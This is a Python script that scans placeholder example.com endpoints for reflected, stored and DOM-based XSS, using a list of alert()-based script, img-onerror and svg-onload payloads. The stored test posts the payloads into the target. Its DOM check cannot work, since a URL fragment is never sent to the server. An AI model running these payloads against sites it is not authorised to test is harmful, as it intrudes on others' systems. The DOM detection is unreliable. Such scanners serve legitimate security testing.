import requests
from bs4 import BeautifulSoup

# Define XSS payloads
xss_payloads = [
    '<script>alert("XSS")</script>',
    '"><script>alert("XSS")</script>',
    "'><script>alert('XSS')</script>",
    "<img src='x' onerror='alert(\"XSS\")'>",
    "<svg/onload=alert(\"XSS\")>"
]

# Define target URLs for scanning
target_urls = {
    'reflected': 'http://example.com/reflected_xss_endpoint',
    'stored': 'http://example.com/stored_xss_endpoint',
    'dom': 'http://example.com/dom_xss_endpoint'
}

# Function to scan reflected XSS
def scan_reflected_xss(url, payloads):
    for payload in payloads:
        response = requests.get(url, params={'input': payload})
        if payload in response.text:
            print(f"[Reflected XSS] Vulnerability found at {url} with payload: {payload}")

# Function to scan stored XSS
def scan_stored_xss(url, payloads):
    for payload in payloads:
        # Step 1: Submit the payload
        requests.post(url, data={'input': payload})
        # Step 2: Check if the payload is stored
        response = requests.get(url)
        if payload in response.text:
            print(f"[Stored XSS] Vulnerability found at {url} with payload: {payload}")

# Function to scan DOM-based XSS
def scan_dom_xss(url, payloads):
    for payload in payloads:
        full_url = f"{url}#{payload}"
        response = requests.get(full_url)
        soup = BeautifulSoup(response.text, 'html.parser')
        # Simple check if payload is part of a script or an attribute
        if soup.find(string=lambda text: payload in text if text else False):
            print(f"[DOM XSS] Vulnerability found at {url} with payload: {payload}")

# Main function to run all XSS scans
def main():
    print("Starting XSS vulnerability scans...")

    # Scan for reflected XSS
    print("Scanning for Reflected XSS...")
    scan_reflected_xss(target_urls['reflected'], xss_payloads)

    # Scan for stored XSS
    print("Scanning for Stored XSS...")
    scan_stored_xss(target_urls['stored'], xss_payloads)

    # Scan for DOM-based XSS
    print("Scanning for DOM-based XSS...")
    scan_dom_xss(target_urls['dom'], xss_payloads)

    print("XSS vulnerability scans completed.")

if __name__ == "__main__":
    main()
